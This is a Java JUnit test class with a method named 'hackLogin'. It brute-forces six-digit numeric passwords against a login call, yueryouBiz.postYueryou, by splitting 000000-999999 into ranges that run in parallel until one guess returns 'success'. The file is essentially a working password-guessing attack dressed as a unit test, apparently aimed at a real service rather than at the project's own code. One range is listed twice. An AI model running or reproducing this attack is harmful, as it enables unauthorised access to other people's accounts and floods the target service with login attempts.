package cn.colams.biz.haipi111;


import cn.colams.biz.dalTest;
import org.apache.commons.lang3.StringUtils;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.test.context.junit4.SpringRunner;

import java.util.Arrays;
import java.util.List;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.Executor;
import java.util.stream.Collectors;

@RunWith(SpringRunner.class)
@SpringBootTest(classes = dalTest.class)
@SpringBootApplication(scanBasePackages = {"cn.colams"})
public class YueryouBizTest {


    private static final Logger logger = LoggerFactory.getLogger(YueryouBizTest.class);

    private static final char[] intArray = new char[]
            {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9'};

    private static final char[] arrayArray = new char[]
            {'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'};

    @Autowired
    Executor taskExecutor;

    @Autowired
    YueryouBiz yueryouBiz;

    @Test
    public void testPostYueryou() throws ExecutionException, InterruptedException {
        String result = hackLogin();
        logger.info(result);
    }

    private String hackLogin() throws ExecutionException, InterruptedException {

        StringBuilder result = new StringBuilder();
        List<String> stepList = Arrays.asList(
                "0-100000",
                "100001-200000",
                "100001-200000",
                "200001-300000",
                "300001-400000",
                "400001-500000",
                "500001-600000",
                "600001-700000",
                "700001-800000",
                "800001-900000",
                "900001-999999");
        List<CompletableFuture<String>> futures = stepList.stream()
                .map(e -> CompletableFuture.supplyAsync(() ->
                                loopHackLogin(e),
                        taskExecutor))
                .collect(Collectors.toList());
        for (int i = 0; i < futures.size(); i++) {
            String res = futures.get(i).get();
            if (StringUtils.isNotEmpty(res)) {
                result.append(res);
                break;
            }
        }
        return result.toString();
    }

    private String loopHackLogin(String step) {
        List<Integer> array = Arrays.stream(step.split("-")).map(e -> Integer.valueOf(e)).collect(Collectors.toList());

        char[] charArray = new char[6];
        String password = null;
        for (int i = array.get(0); i <= array.get(1); i++) {
            String tem = String.valueOf(i);
            char[] tempChar = tem.toCharArray();
            int n = charArray.length - tempChar.length;
            if (n > 0) {
                for (int j = 0; j < n; j++) {
                    charArray[j] = '0';
                }

                for (int j = 0; j < tempChar.length; j++) {
                    charArray[n + j] = tempChar[j];
                }

            } else {
                charArray = tempChar;
            }
            //            char[] charArrayTemp = initCharArrayTemp(charArray);
            String pwd = String.copyValueOf(charArray);
            String result = yueryouBiz.postYueryou(pwd);
            logger.info(result);
            if (result.equalsIgnoreCase("success")) {
                password = pwd;
                break;
            }
        }
        return password;
    }


    private char[] initCharArrayTemp(char[] charArray) {
        char[] charArrayTemp = new char[6];
        charArrayTemp[0] = 'w';
        charArrayTemp[1] = 'a';
        charArrayTemp[2] = charArray[0];
        charArrayTemp[3] = charArray[1];
        charArrayTemp[4] = charArray[2];
        charArrayTemp[5] = charArray[3];
        return charArrayTemp;
    }

}